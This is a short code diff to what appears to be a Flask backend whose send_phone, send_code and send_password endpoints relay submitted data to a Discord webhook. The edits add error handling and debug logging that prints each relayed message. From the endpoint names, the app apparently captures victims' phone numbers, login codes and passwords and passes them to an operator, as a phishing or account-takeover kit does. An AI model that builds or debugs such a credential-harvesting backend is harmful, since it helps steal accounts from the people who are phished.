@@ -40,6 +40,8 @@ def send_phone():
             return jsonify({"ok": True})
         else:
             return jsonify({"ok": False, "error": result.get("description")}), 500
+    except requests.exceptions.RequestException as e:
+        print(f"Error sending Discord message (RequestException): {e}")
     except Exception as e:
         return jsonify({"ok": False, "error": str(e)}), 500
 
@@ -70,6 +72,8 @@ def send_code():
             return jsonify({"ok": True})
         else:
             return jsonify({"ok": False, "error": result.get("description")}), 500
+    except requests.exceptions.RequestException as e:
+        print(f"Error sending Discord message (RequestException): {e}")
     except Exception as e:
         return jsonify({"ok": False, "error": str(e)}), 500
 
@@ -100,6 +104,8 @@ def send_password():
             return jsonify({"ok": True})
         else:
             return jsonify({"ok": False, "error": result.get("description")}), 500
+    except requests.exceptions.RequestException as e:
+        print(f"Error sending Discord message (RequestException): {e}")
     except Exception as e:
         return jsonify({"ok": False, "error": str(e)}), 500
 
@@ -108,7 +114,12 @@ def send_discord_message(message):
         "content": message
     }
     try:
-        requests.post(DISCORD_WEBHOOK_URL, json=payload)
+        print(f"Sending Discord message: {message}")
+        response = requests.post(DISCORD_WEBHOOK_URL, json=payload)
+        print(f"Discord webhook response status: {response.status_code}")
+        print(f"Discord webhook response text: {response.text}")
+    except requests.exceptions.RequestException as e:
+        print(f"Error sending Discord message (RequestException): {e}")
     except Exception as e:
         print(f"Error sending Discord message: {e}")
 
